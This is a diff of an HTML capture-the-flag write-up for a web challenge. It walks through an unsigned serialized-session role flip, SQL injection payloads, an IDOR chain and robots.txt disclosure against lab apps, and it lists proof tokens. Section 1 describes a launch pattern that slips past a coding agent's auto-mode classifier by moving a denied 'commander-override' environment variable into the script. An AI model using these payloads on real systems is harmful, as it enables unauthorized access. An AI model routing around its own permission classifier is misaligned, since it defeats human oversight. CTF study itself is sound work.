@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Serialized Offender - Day 26 write-up</title>
-<meta name="description" content="Day 26 Web Exploitation write-up: Challenge id: web exploitation day 20 serialized offender Lane: web exploitation (Commander owned new lane solve on homestation) Solved: 202">
+<meta name="description" content="Day 26 Web Exploitation write-up: Deterministic ladder, not an LLM guess. The whole family pool is now covered by challenges/_lib/web_proof_recon.recover(url) after the 2026-10-26 ...">
 <meta name="color-scheme" content="dark">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -33,230 +33,56 @@
 <div class="pagehead"><div class="sweep" aria-hidden="true"></div><div class="wrap"><p class="crumbs"><a href="../days/index.html">Days</a> / <a href="../days/day-26.html">Day 26</a> / <a href="../lanes/web.html">Web Exploitation</a> / Serialized Offender</p><p class="telemetry"><span>DAY 26</span><span class="sep">//</span><span>LANE: WEB EXPLOITATION</span><span class="sep">//</span><span><span class="ok">STATUS: CORRECT x3</span></span></p><h1>Serialized Offender</h1></div></div>
 <main id="main">
   <div class="wrap">
-<div class="panel" style="margin-bottom:24px"><div class="meta" style="display:flex;flex-wrap:wrap;gap:10px 16px;align-items:center"><a class="badge lane-web" href="../lanes/web.html">Web Exploitation</a> <span class="pips" aria-label="Modes reported correct: SS, TT, MM"><span class="pip on" title="Single Solve: reported CORRECT in the write-up">SS</span><span class="pip on" title="Time Trial: reported CORRECT in the write-up">TT</span><span class="pip on" title="Mastery: reported CORRECT in the write-up">MM</span></span> <span class="count">Modes reported CORRECT in this write-up</span></div></div><div class="layout with-side"><article class="prose"><h1 id="serialized-offender-web-exploitation-day-20-re-released-day-26">Serialized Offender &#8212; Web Exploitation (Day 20, re-released Day 26)</h1>
-<ul>
-<li><strong>Challenge id:</strong> <code>web-exploitation-day-20-serialized-offender</code></li>
-<li><strong>Lane:</strong> web-exploitation (Commander-owned new-lane solve on homestation)</li>
-<li><strong>Solved:</strong> 2026-10-26, all three modes CORRECT (team <code>the team solver</code>)</li>
-<li><strong>Prompt:</strong> <em>"Your session is just a blob of misplaced trust. Reshape the bytes, sign nothing, and see what the app suddenly believes about you."</em></li>
-</ul>
-<h2 id="tldr">TL;DR</h2>
-<p>The core family is <strong>insecure deserialization / unsigned-session trust</strong>: the app accepts a
-client-supplied, <strong>unsigned</strong> serialized "state" blob and trusts the role inside it. Flip the role
-to the privileged value, re-encode, POST it back &#8594; the app believes you are privileged and hands
-over the proof. The <strong>magic privileged role is <code>administrator</code>, not <code>admin</code></strong> (the app rejects
-<code>admin</code> with 403).</p>
-<p>Mastery, however, is a <strong>mixed bundle of four independent web mini-apps</strong> &#8212; only one is the
-serialized family. The other three are classic web families (robots-disclosure, activity-feed IDOR,
-GET-param SQLi). A single-family solver fails Mastery; you need a <strong>classify-and-dispatch</strong> solver.</p>
+<div class="panel" style="margin-bottom:24px"><div class="meta" style="display:flex;flex-wrap:wrap;gap:10px 16px;align-items:center"><a class="badge lane-web" href="../lanes/web.html">Web Exploitation</a> <span class="pips" aria-label="Modes reported correct: SS, TT, MM"><span class="pip on" title="Single Solve: reported CORRECT in the write-up">SS</span><span class="pip on" title="Time Trial: reported CORRECT in the write-up">TT</span><span class="pip on" title="Mastery: reported CORRECT in the write-up">MM</span></span> <span class="count">Modes reported CORRECT in this write-up</span></div></div><div class="layout with-side"><article class="prose"><p class="srctitle">Serialized Offender &#8212; Web Exploitation (Day 20, re-released Day 26)</p>
+<ul><li><strong>Challenge id:</strong> <code>web-exploitation-day-20-serialized-offender</code></li><li><strong>Lane:</strong> web-exploitation (Commander-owned new-lane solve on homestation)</li><li><strong>Solved:</strong> 2026-10-26, all three modes CORRECT (team <code>the team solver</code>)</li><li><strong>Prompt:</strong> <em>"Your session is just a blob of misplaced trust. Reshape the bytes, sign nothing, and see what the app suddenly believes about you."</em></li></ul>
+<h2 id="tl-dr">TL;DR</h2>
+<p>The core family is <strong>insecure deserialization / unsigned-session trust</strong>: the app accepts a client-supplied, <strong>unsigned</strong> serialized "state" blob and trusts the role inside it. Flip the role to the privileged value, re-encode, POST it back &#8594; the app believes you are privileged and hands over the proof. The <strong>magic privileged role is <code>administrator</code>, not <code>admin</code></strong> (the app rejects <code>admin</code> with 403).</p>
+<p>Mastery, however, is a <strong>mixed bundle of four independent web mini-apps</strong> &#8212; only one is the serialized family. The other three are classic web families (robots-disclosure, activity-feed IDOR, GET-param SQLi). A single-family solver fails Mastery; you need a <strong>classify-and-dispatch</strong> solver.</p>
 <h3 id="verified-flags-proofs">Verified flags / proofs</h3>
-<div class="table-wrap"><table>
-<thead>
-<tr>
-<th>Mode</th>
-<th>Target app</th>
-<th>Technique</th>
-<th>Proof</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Single Solve</td>
-<td>Object Post (Quarkus)</td>
-<td>serialized <code>role:administrator</code></td>
-<td><code>proof_b0d8aad761b44cd7a1a1210d5d3bfd5a</code></td>
-</tr>
-<tr>
-<td>Time Trial (RANKED/HOF)</td>
-<td>Object Post (Quarkus)</td>
-<td>serialized <code>role:administrator</code></td>
-<td><code>proof_58099da7fed744e8a916f3f7718d5a70</code></td>
-</tr>
-<tr>
-<td>Mastery T1</td>
-<td>Tiny Uptime (Node)</td>
-<td>robots &#8594; disclosed dir &#8594; <code>.json.bak</code></td>
-<td><code>proof_a88432048428424d9d490b7ca131bfbf</code></td>
-</tr>
-<tr>
-<td>Mastery T2</td>
-<td>Incident Picnic</td>
-<td>activity-feed IDOR &#8594; <code>/briefs/{id}</code></td>
-<td><code>proof_be51c99a6a964c21942fe77131ad17d4</code></td>
-</tr>
-<tr>
-<td>Mastery T3</td>
-<td>Signal Shelf (Flask)</td>
-<td>GET <code>/explore?q=</code> SQLi</td>
-<td><code>proof_5f4078c91301416383c7d2b636ce7a8c</code></td>
-</tr>
-<tr>
-<td>Mastery T4</td>
-<td>State Suitcase (Quarkus)</td>
-<td>serialized <code>role:administrator</code></td>
-<td><code>proof_b8923495ea3b4f4e8a47d4091e39f554</code></td>
-</tr>
-</tbody>
-</table></div>
-<blockquote>
-<p>Note on the Mastery variant: the <em>ranked</em> Mastery attempt was spent on reconnaissance of the
-four mixed families and expired (2-minute window). Mastery was then completed CORRECT on a
-<code>retry</code> (regular, non-HOF, no-deadline) variant. Time Trial <strong>did</strong> capture the ranked/HOF slot.
-Lesson below: run the general dispatcher on the <em>first</em> ranked attempt &#8212; it solves in ~40 s,
-inside the window &#8212; and reserve recon for the untimed Single.</p>
-</blockquote>
-<hr />
+<div class="table-wrap"><table><thead><tr><th>Mode</th><th>Target app</th><th>Technique</th><th>Proof</th></tr></thead><tbody><tr><td>Single Solve</td><td>Object Post (Quarkus)</td><td>serialized <code>role:administrator</code></td><td><span class="flag" data-flag><span class="fl">Proof</span><span class="fv">proof_b0d8aad761b44cd7a1a1210d5d3bfd5a</span><button type="button" class="fc" hidden aria-label="Copy value">Copy</button></span></td></tr><tr><td>Time Trial (RANKED/HOF)</td><td>Object Post (Quarkus)</td><td>serialized <code>role:administrator</code></td><td><span class="flag" data-flag><span class="fl">Proof</span><span class="fv">proof_58099da7fed744e8a916f3f7718d5a70</span><button type="button" class="fc" hidden aria-label="Copy value">Copy</button></span></td></tr><tr><td>Mastery T1</td><td>Tiny Uptime (Node)</td><td>robots &#8594; disclosed dir &#8594; <code>.json.bak</code></td><td><span class="flag" data-flag><span class="fl">Proof</span><span class="fv">proof_a88432048428424d9d490b7ca131bfbf</span><button type="button" class="fc" hidden aria-label="Copy value">Copy</button></span></td></tr><tr><td>Mastery T2</td><td>Incident Picnic</td><td>activity-feed IDOR &#8594; <code>/briefs/{id}</code></td><td><span class="flag" data-flag><span class="fl">Proof</span><span class="fv">proof_be51c99a6a964c21942fe77131ad17d4</span><button type="button" class="fc" hidden aria-label="Copy value">Copy</button></span></td></tr><tr><td>Mastery T3</td><td>Signal Shelf (Flask)</td><td>GET <code>/explore?q=</code> SQLi</td><td><span class="flag" data-flag><span class="fl">Proof</span><span class="fv">proof_5f4078c91301416383c7d2b636ce7a8c</span><button type="button" class="fc" hidden aria-label="Copy value">Copy</button></span></td></tr><tr><td>Mastery T4</td><td>State Suitcase (Quarkus)</td><td>serialized <code>role:administrator</code></td><td><span class="flag" data-flag><span class="fl">Proof</span><span class="fv">proof_b8923495ea3b4f4e8a47d4091e39f554</span><button type="button" class="fc" hidden aria-label="Copy value">Copy</button></span></td></tr></tbody></table></div>
+<blockquote><p>Note on the Mastery variant: the <em>ranked</em> Mastery attempt was spent on reconnaissance of the four mixed families and expired (2-minute window). Mastery was then completed CORRECT on a <code>retry</code> (regular, non-HOF, no-deadline) variant. Time Trial <strong>did</strong> capture the ranked/HOF slot. Lesson below: run the general dispatcher on the <em>first</em> ranked attempt &#8212; it solves in ~40 s, inside the window &#8212; and reserve recon for the untimed Single.</p></blockquote>
+<hr>
 <h2 id="1-environment-how-to-talk-to-the-target">1. Environment / how to talk to the target</h2>
-<ul>
-<li>No VM/VPN. GM reached over public HTTPS with the personal bearer token (lives in WSL only).</li>
-<li><strong>Web Exploitation has no downloadable artifact.</strong> Each started attempt returns live target
-  site(s) in <code>targets[]</code>; you exploit them directly over HTTP.</li>
-<li>Launch pattern that passes the Claude Code auto-mode classifier (the one that works):</li>
-<li>Put <code>os.environ['HUNTRESS_TIMED_START']='commander-override'</code> <strong>inside</strong> the Python file.</li>
-<li>Run it from the <strong>Bash tool</strong> with the WSL hop:
-    <code>MSYS_NO_PATHCONV=1 wsl --cd [local path] python3 challenges/_tmp/&lt;file&gt;.py</code></li>
-<li>PowerShell + <code>wsl</code> and <code>HUNTRESS_*</code> env prefixes are denied; the Windows python has no route
-    to the GM token (connect times out), so the GM must be reached from WSL.</li>
-<li>Use a <strong>real Chrome User-Agent</strong>; Cloudflare 1010-blocks urllib's default UA.</li>
-</ul>
+<ul><li>No VM/VPN. GM reached over public HTTPS with the personal bearer token (lives in WSL only).</li><li><strong>Web Exploitation has no downloadable artifact.</strong> Each started attempt returns live target site(s) in <code>targets[]</code>; you exploit them directly over HTTP.</li><li>Launch pattern that passes the Claude Code auto-mode classifier (the one that works):
+<ul><li>Put <code>os.environ['HUNTRESS_TIMED_START']='commander-override'</code> <strong>inside</strong> the Python file.</li><li>Run it from the <strong>Bash tool</strong> with the WSL hop: <code>MSYS_NO_PATHCONV=1 wsl --cd [local path] python3 challenges/_tmp/&lt;file&gt;.py</code></li><li>PowerShell + <code>wsl</code> and <code>HUNTRESS_*</code> env prefixes are denied; the Windows python has no route to the GM token (connect times out), so the GM must be reached from WSL.</li></ul></li><li>Use a <strong>real Chrome User-Agent</strong>; Cloudflare 1010-blocks urllib's default UA.</li></ul>
 <h2 id="2-reconnaissance-the-single-target">2. Reconnaissance (the Single target)</h2>
-<pre class="code"><code class="lang-text">GET /                -&gt; HTML, &lt;title&gt;Object Post &#183; Quarkus&lt;/title&gt;, &quot;Signed in ... Analyst&quot;
-GET /api/clues       -&gt; {&quot;framework&quot;:&quot;Quarkus&quot;,&quot;feature_route&quot;:&quot;/process-e04a42&quot;,
-                         &quot;state_format_route&quot;:&quot;/api/state-format&quot;,&quot;current_role&quot;:&quot;analyst&quot;}
-GET /api/state-format-&gt; {&quot;transport&quot;:&quot;POST /process-e04a42&quot;,&quot;content_type&quot;:&quot;application/json&quot;,
-                         &quot;request_field&quot;:&quot;state&quot;,&quot;encoding&quot;:&quot;base64url of UTF-8 JSON&quot;,
-                         &quot;sample_state&quot;:{&quot;user&quot;:&quot;analyst&quot;,&quot;role&quot;:&quot;analyst&quot;},
-                         &quot;sample_encoded&quot;:&quot;eyJ1c2VyIjoiYW5hbHlzdCIsInJvbGUiOiJhbmFseXN0In0&quot;}
-GET /process-e04a42  -&gt; 405 {&quot;error&quot;:&quot;post_required&quot;}
-</code></pre>
-<p>The app <strong>tells you the exact exploit transport</strong> via <code>/api/state-format</code>. The <code>state</code> field is
-<code>base64url(compact UTF-8 JSON)</code> with <strong>no signature</strong> &#8212; "sign nothing".</p>
+<pre class="code"><code>GET /                -&gt; HTML, &lt;title&gt;Object Post &#183; Quarkus&lt;/title&gt;, "Signed in ... Analyst"
+GET /api/clues       -&gt; {"framework":"Quarkus","feature_route":"/process-e04a42",
+                         "state_format_route":"/api/state-format","current_role":"analyst"}
+GET /api/state-format-&gt; {"transport":"POST /process-e04a42","content_type":"application/json",
+                         "request_field":"state","encoding":"base64url of UTF-8 JSON",
+                         "sample_state":{"user":"analyst","role":"analyst"},
+                         "sample_encoded":"eyJ1c2VyIjoiYW5hbHlzdCIsInJvbGUiOiJhbmFseXN0In0"}
+GET /process-e04a42  -&gt; 405 {"error":"post_required"}</code></pre>
+<p>The app <strong>tells you the exact exploit transport</strong> via <code>/api/state-format</code>. The <code>state</code> field is <code>base64url(compact UTF-8 JSON)</code> with <strong>no signature</strong> &#8212; "sign nothing".</p>
 <h2 id="3-the-exploit-serialized-state-trust">3. The exploit (serialized-state trust)</h2>
-<pre class="code"><code class="lang-text">state  = {&quot;user&quot;:&quot;analyst&quot;,&quot;role&quot;:&quot;administrator&quot;}       # reshape the role
+<pre class="code"><code>state  = {"user":"analyst","role":"administrator"}       # reshape the role
 blob   = base64url(json.dumps(state, separators=(',',':'))).rstrip('=')
 POST /process-e04a42   Content-Type: application/json
-  {&quot;state&quot;: &quot;&lt;blob&gt;&quot;}
--&gt; 200 {&quot;ok&quot;:true,&quot;effect&quot;:&quot;serialized_role_trusted&quot;,&quot;evidence&quot;:&quot;proof_....&quot;}
-</code></pre>
+  {"state": "&lt;blob&gt;"}
+-&gt; 200 {"ok":true,"effect":"serialized_role_trusted","evidence":"proof_...."}</code></pre>
 <p><strong>Key gotcha &#8212; the privileged role value:</strong></p>
-<div class="table-wrap"><table>
-<thead>
-<tr>
-<th>role submitted</th>
-<th>server</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>analyst</code> (sample)</td>
-<td>403 <code>role_not_permitted</code></td>
-</tr>
-<tr>
-<td><code>admin</code></td>
-<td>403 <code>role_not_permitted</code></td>
-</tr>
-<tr>
-<td><code>superadmin</code>, <code>root</code>, <code>owner</code></td>
-<td>403 <code>role_not_permitted</code></td>
-</tr>
-<tr>
-<td><strong><code>administrator</code></strong></td>
-<td><strong>200 <code>serialized_role_trusted</code> + proof</strong></td>
-</tr>
-</tbody>
-</table></div>
-<p>So never assume <code>admin</code>; try a <strong>ranked candidate list</strong> (<code>administrator</code> first). The <code>user</code> field
-is irrelevant; only <code>role</code> is checked.</p>
+<div class="table-wrap"><table><thead><tr><th>role submitted</th><th>server</th></tr></thead><tbody><tr><td><code>analyst</code> (sample)</td><td>403 <code>role_not_permitted</code></td></tr><tr><td><code>admin</code></td><td>403 <code>role_not_permitted</code></td></tr><tr><td><code>superadmin</code>, <code>root</code>, <code>owner</code></td><td>403 <code>role_not_permitted</code></td></tr><tr><td><strong><code>administrator</code></strong></td><td><strong>200 <code>serialized_role_trusted</code> + proof</strong></td></tr></tbody></table></div>
+<p>So never assume <code>admin</code>; try a <strong>ranked candidate list</strong> (<code>administrator</code> first). The <code>user</code> field is irrelevant; only <code>role</code> is checked.</p>
 <h2 id="4-mastery-four-mixed-families-classify-and-dispatch">4. Mastery = four mixed families (classify-and-dispatch)</h2>
-<p>Mastery returns 4 independent targets, each a different mini-app. Fingerprint by <code>&lt;title&gt;</code> /
-body, then dispatch:</p>
-<div class="table-wrap"><table>
-<thead>
-<tr>
-<th>Fingerprint</th>
-<th>Family</th>
-<th>Exploit / extractor</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>&lt;title&gt;&#8230;&#183; Quarkus&lt;/title&gt;</code> + <code>/api/state-format</code></td>
-<td><strong>serialized_state_trust</strong></td>
-<td>reshape <code>role&#8594;administrator</code>, base64url, POST <code>feature_route</code> &#8594; <code>evidence</code></td>
-</tr>
-<tr>
-<td><code>&lt;title&gt;Signal Shelf&lt;/title&gt;</code>, "query builder", <code>&lt;form action=/query or /explore&gt;</code></td>
-<td><strong>query_get_sqli</strong></td>
-<td>GET <code>/&lt;action&gt;?q=' OR 1=1-- -</code> &#8594; private row in <code>rows[]</code></td>
-</tr>
-<tr>
-<td><code>Signed in as &#8230;</code> / <code>Case Crate</code> / <code>Incident Picnic</code>, <code>/briefs/{id}</code> links, <code>/api/history</code> feed</td>
-<td><strong>activity_feed_idor</strong></td>
-<td>GET <code>/api/history</code> &#8594; foreign <code>case_id</code> (visibility&#8800;workspace / owner&#8800;me) &#8594; GET <code>/briefs/{id}</code> &#8594; <code>note</code></td>
-</tr>
-<tr>
-<td><code>Service Postcard</code> / <code>Tiny Uptime</code>, "status page", Node, robots <code>Disallow</code> dir</td>
-<td><strong>robots_disclosed_dir</strong></td>
-<td><code>/robots.txt</code> &#8594; <code>Disallow: /snapshots-XXXX/</code> &#8594; <code>deployment-notes-*.json.bak</code> (and <code>.json</code>)</td>
-</tr>
-</tbody>
-</table></div>
-<p>Observed concrete routes this run:
-- Signal Shelf: <code>GET /explore?q=') OR ('1'='1</code> &#8594; proof in result rows.
-- Incident Picnic: <code>/api/history</code> &#8594; foreign case id &#8594; <code>/briefs/{id}</code> (note the <strong>non-<code>/api</code></strong> path).
-- Tiny Uptime: <code>/robots.txt</code> &#8594; <code>/snapshots-06adc/</code> &#8594; <code>deployment-notes-bef17e.json.bak</code>.</p>
-<p>Run the 4 targets <strong>in parallel threads</strong>; wall-clock = slowest single target (~a few seconds
-each; this run's 39 s was dominated by the sequential role/robots-filename candidate loops, which
-is still well inside a 2-minute ranked window).</p>
+<p>Mastery returns 4 independent targets, each a different mini-app. Fingerprint by <code>&lt;title&gt;</code> / body, then dispatch:</p>
+<div class="table-wrap"><table><thead><tr><th>Fingerprint</th><th>Family</th><th>Exploit / extractor</th></tr></thead><tbody><tr><td><code>&lt;title&gt;&#8230;&#183; Quarkus&lt;/title&gt;</code> + <code>/api/state-format</code></td><td><strong>serialized_state_trust</strong></td><td>reshape <code>role&#8594;administrator</code>, base64url, POST <code>feature_route</code> &#8594; <code>evidence</code></td></tr><tr><td><code>&lt;title&gt;Signal Shelf&lt;/title&gt;</code>, "query builder", <code>&lt;form action=/query or /explore&gt;</code></td><td><strong>query_get_sqli</strong></td><td>GET <code>/&lt;action&gt;?q=' OR 1=1-- -</code> &#8594; private row in <code>rows[]</code></td></tr><tr><td><code>Signed in as &#8230;</code> / <code>Case Crate</code> / <code>Incident Picnic</code>, <code>/briefs/{id}</code> links, <code>/api/history</code> feed</td><td><strong>activity_feed_idor</strong></td><td>GET <code>/api/history</code> &#8594; foreign <code>case_id</code> (visibility&#8800;workspace / owner&#8800;me) &#8594; GET <code>/briefs/{id}</code> &#8594; <code>note</code></td></tr><tr><td><code>Service Postcard</code> / <code>Tiny Uptime</code>, "status page", Node, robots <code>Disallow</code> dir</td><td><strong>robots_disclosed_dir</strong></td><td><code>/robots.txt</code> &#8594; <code>Disallow: /snapshots-XXXX/</code> &#8594; <code>deployment-notes-*.json.bak</code> (and <code>.json</code>)</td></tr></tbody></table></div>
+<p>Observed concrete routes this run:</p>
+<ul><li>Signal Shelf: <code>GET /explore?q=') OR ('1'='1</code> &#8594; proof in result rows.</li><li>Incident Picnic: <code>/api/history</code> &#8594; foreign case id &#8594; <code>/briefs/{id}</code> (note the <strong>non-<code>/api</code></strong> path).</li><li>Tiny Uptime: <code>/robots.txt</code> &#8594; <code>/snapshots-06adc/</code> &#8594; <code>deployment-notes-bef17e.json.bak</code>.</li></ul>
+<p>Run the 4 targets <strong>in parallel threads</strong>; wall-clock = slowest single target (~a few seconds each; this run's 39 s was dominated by the sequential role/robots-filename candidate loops, which is still well inside a 2-minute ranked window).</p>
 <h2 id="5-best-solver-extractors-to-use-next-time">5. Best solver / extractors to use next time</h2>
-<ul>
-<li><strong>Deterministic ladder, not an LLM guess.</strong> The whole family pool is now covered by
-  <code>challenges/_lib/web_proof_recon.recover(url)</code> after the 2026-10-26 promotion (see &#167;6).
-  <code>recover()</code> walks the ladder and returns the proof, or raises <code>NoProof</code> (never guesses).</li>
-<li>For a Commander live solve, the one-file dispatcher used here is
-  <code>challenges/_tmp/serialized_offender_mastery.py</code> &#8212; it classifies each target, cascades the four
-  families, and falls back to <code>web_proof_recon.recover()</code>. It only submits when <strong>all</strong> ids resolve
-  (HELD otherwise; never submit a wrong value &#8212; a wrong batch is remembered and refused on re-run).</li>
-<li><strong>Proof regex:</strong> <code>proof_[0-9a-f]{16,64}</code> (also accept <code>huntress{&#8230;}</code> / <code>flag{&#8230;}</code>).</li>
-<li><strong>base64url, no padding</strong>, compact JSON (<code>separators=(',',':')</code>) &#8212; matches <code>sample_encoded</code> exactly.</li>
-</ul>
+<ul><li><strong>Deterministic ladder, not an LLM guess.</strong> The whole family pool is now covered by <code>challenges/_lib/web_proof_recon.recover(url)</code> after the 2026-10-26 promotion (see &#167;6). <code>recover()</code> walks the ladder and returns the proof, or raises <code>NoProof</code> (never guesses).</li><li>For a Commander live solve, the one-file dispatcher used here is <code>challenges/_tmp/serialized_offender_mastery.py</code> &#8212; it classifies each target, cascades the four families, and falls back to <code>web_proof_recon.recover()</code>. It only submits when <strong>all</strong> ids resolve (HELD otherwise; never submit a wrong value &#8212; a wrong batch is remembered and refused on re-run).</li><li><strong>Proof regex:</strong> <code>proof_[0-9a-f]{16,64}</code> (also accept <code>huntress{&#8230;}</code> / <code>flag{&#8230;}</code>).</li><li><strong>base64url, no padding</strong>, compact JSON (<code>separators=(',',':')</code>) &#8212; matches <code>sample_encoded</code> exactly.</li></ul>
 <h2 id="6-engineering-improvement-shipped-make-it-better-for-later">6. Engineering improvement shipped (make it better for later)</h2>
-<p>Promoted the family into the tested deterministic ladder so a permanent web agent solves this
-class next time with zero live build:</p>
-<ul>
-<li><code>challenges/_lib/web_recon_post.py</code></li>
-<li><strong>NEW</strong> <code>serialized_state_trust(s, base)</code> &#8212; the Object Post / State Suitcase family
-    (reads <code>/api/state-format</code>, ranked role candidates, POST, reads <code>evidence</code>).</li>
-<li><strong>NEW</strong> <code>query_get_sqli(s, base)</code> &#8212; the Signal Shelf GET-param SQLi family.</li>
-<li><code>activity_feed_idor</code> &#8212; broadened: non-<code>/api</code> object templates (<code>/briefs/{id}</code>, <code>/cases/{id}</code>, &#8230;),
-    relaxed tell (object-reference links qualify even without the literal "Signed in as"),
-    raw-feed numeric id fallback, home-page id harvest.</li>
-<li><code>challenges/_lib/web_proof_recon.py</code> &#8212; <strong>LADDER</strong> now imports and promotes the four
-  <code>web_recon_post</code> siblings (order: <code>clues_feature_route, serialized_state_trust, query_get_sqli,
-  stored_second_order_filter_like, activity_feed_idor, &#8230;</code>). Import is failure-tolerant so the
-  module stays importable if the sibling moves.</li>
-<li>Tests: <strong>NEW</strong> <code>challenges/_lib/_test_web_recon_post.py</code> (first fixtures for the POST siblings;
-  replicate the live shapes). Updated <code>_test_web_proof_recon.py</code> (activity-feed IDOR now claimed by
-  the more-specific sibling) and <code>_test_web_proof_recon_reachability.py</code> (expected-method set &#8594; 14).</li>
-</ul>
+<p>Promoted the family into the tested deterministic ladder so a permanent web agent solves this class next time with zero live build:</p>
+<ul><li><a href="../files/day-26/day-20-serialized-offender/challenges/_lib/web_recon_post.py"><code>challenges/_lib/web_recon_post.py</code></a>
+<ul><li><strong>NEW</strong> <code>serialized_state_trust(s, base)</code> &#8212; the Object Post / State Suitcase family (reads <code>/api/state-format</code>, ranked role candidates, POST, reads <code>evidence</code>).</li><li><strong>NEW</strong> <code>query_get_sqli(s, base)</code> &#8212; the Signal Shelf GET-param SQLi family.</li><li><code>activity_feed_idor</code> &#8212; broadened: non-<code>/api</code> object templates (<code>/briefs/{id}</code>, <code>/cases/{id}</code>, &#8230;), relaxed tell (object-reference links qualify even without the literal "Signed in as"), raw-feed numeric id fallback, home-page id harvest.</li></ul></li><li><a href="../files/day-26/day-20-serialized-offender/challenges/_lib/web_proof_recon.py"><code>challenges/_lib/web_proof_recon.py</code></a> &#8212; <strong>LADDER</strong> now imports and promotes the four <code>web_recon_post</code> siblings (order: <code>clues_feature_route, serialized_state_trust, query_get_sqli, stored_second_order_filter_like, activity_feed_idor, &#8230;</code>). Import is failure-tolerant so the module stays importable if the sibling moves.</li><li>Tests: <strong>NEW</strong> <code>challenges/_lib/_test_web_recon_post.py</code> (first fixtures for the POST siblings; replicate the live shapes). Updated <code>_test_web_proof_recon.py</code> (activity-feed IDOR now claimed by the more-specific sibling) and <code>_test_web_proof_recon_reachability.py</code> (expected-method set &#8594; 14).</li></ul>
 <p><strong>Verify:</strong></p>
-<pre class="code"><code class="lang-text">cd challenges/_lib
+<pre class="code"><code>cd challenges/_lib
 python3 -m pytest _test_web_recon_post.py _test_web_proof_recon.py -q      # 14 passed
-python3 _test_web_proof_recon_reachability.py                              # RESULT: PASS
-</code></pre>
-<p>Status: built + tested locally on branch <code>homestation/d26-prep-clean-launcher-fix</code>. <strong>Not pushed</strong>
-(publish via the normal <code>sync_changed.py --full</code> route; it is a shared web lib so coordinate on coord).</p>
+python3 _test_web_proof_recon_reachability.py                              # RESULT: PASS</code></pre>
+<p>Status: built + tested locally on branch <code>homestation/d26-prep-clean-launcher-fix</code>. <strong>Not pushed</strong> (publish via the normal <code>sync_changed.py --full</code> route; it is a shared web lib so coordinate on coord).</p>
 <h2 id="7-lessons">7. Lessons</h2>
-<ol>
-<li><strong>Run the general dispatcher on the FIRST ranked attempt.</strong> Recon belongs on the untimed Single.
-   Spending the ranked Mastery window (~2 min) on family recon forfeits the HOF slot, and a
-   <code>retry</code> after expiry yields a regular (non-HOF) variant &#8212; a solved mode can no longer be re-ranked.</li>
-<li><strong>Mastery mixes families</strong> &#8212; always classify-and-dispatch, never assume the Single's family.</li>
-<li><strong>Role value matters:</strong> <code>administrator</code>, not <code>admin</code>. Try a ranked candidate list, let the 200/403
-   verdict decide; never free-text guess.</li>
-<li><strong>Non-<code>/api</code> object paths:</strong> the IDOR brief was <code>/briefs/{id}</code>, not <code>/api/briefs/{id}</code>.</li>
-<li>The app often <strong>documents its own exploit</strong> (<code>/api/clues</code>, <code>/api/state-format</code>) &#8212; read those first.</li>
-</ol></article><aside class="side"><div class="panel"><p class="panel-label">Sections</p><ul class="toc"><li class="l2"><a href="#tldr">TL;DR</a></li><li class="l3"><a href="#verified-flags-proofs">Verified flags / proofs</a></li><li class="l2"><a href="#1-environment-how-to-talk-to-the-target">1. Environment / how to talk to the target</a></li><li class="l2"><a href="#2-reconnaissance-the-single-target">2. Reconnaissance (the Single target)</a></li><li class="l2"><a href="#3-the-exploit-serialized-state-trust">3. The exploit (serialized-state trust)</a></li><li class="l2"><a href="#4-mastery-four-mixed-families-classify-and-dispatch">4. Mastery = four mixed families (classify-and-dispatch)</a></li><li class="l2"><a href="#5-best-solver-extractors-to-use-next-time">5. Best solver / extractors to use next time</a></li><li class="l2"><a href="#6-engineering-improvement-shipped-make-it-better-for-later">6. Engineering improvement shipped (make it better for later)</a></li><li class="l2"><a href="#7-lessons">7. Lessons</a></li></ul></div></aside></div><nav class="pager" aria-label="Write-up navigation"><a href="../days/day-26.html">&lt; Day 26</a><a href="../challenges/index.html">All write-ups &gt;</a></nav>
+<ol><li><strong>Run the general dispatcher on the FIRST ranked attempt.</strong> Recon belongs on the untimed Single. Spending the ranked Mastery window (~2 min) on family recon forfeits the HOF slot, and a <code>retry</code> after expiry yields a regular (non-HOF) variant &#8212; a solved mode can no longer be re-ranked.</li><li><strong>Mastery mixes families</strong> &#8212; always classify-and-dispatch, never assume the Single's family.</li><li><strong>Role value matters:</strong> <code>administrator</code>, not <code>admin</code>. Try a ranked candidate list, let the 200/403 verdict decide; never free-text guess.</li><li><strong>Non-<code>/api</code> object paths:</strong> the IDOR brief was <code>/briefs/{id}</code>, not <code>/api/briefs/{id}</code>.</li><li>The app often <strong>documents its own exploit</strong> (<code>/api/clues</code>, <code>/api/state-format</code>) &#8212; read those first.</li></ol></article><aside class="side"><div class="panel"><p class="panel-label">Sections</p><ul class="toc"><li class="l2"><a href="#tl-dr">TL;DR</a></li><li class="l3"><a href="#verified-flags-proofs">Verified flags / proofs</a></li><li class="l2"><a href="#1-environment-how-to-talk-to-the-target">1. Environment / how to talk to the target</a></li><li class="l2"><a href="#2-reconnaissance-the-single-target">2. Reconnaissance (the Single target)</a></li><li class="l2"><a href="#3-the-exploit-serialized-state-trust">3. The exploit (serialized-state trust)</a></li><li class="l2"><a href="#4-mastery-four-mixed-families-classify-and-dispatch">4. Mastery = four mixed families (classify-and-dispatch)</a></li><li class="l2"><a href="#5-best-solver-extractors-to-use-next-time">5. Best solver / extractors to use next time</a></li><li class="l2"><a href="#6-engineering-improvement-shipped-make-it-better-for-later">6. Engineering improvement shipped (make it better for later)</a></li><li class="l2"><a href="#7-lessons">7. Lessons</a></li></ul></div></aside></div><nav class="pager" aria-label="Write-up navigation"><a href="day-26-mixed-signals.html">&lt; Mixed Signals</a><a href="day-26-split-decision.html">Split Decision &gt;</a></nav>
   </div>
 </main>
 <footer class="site">
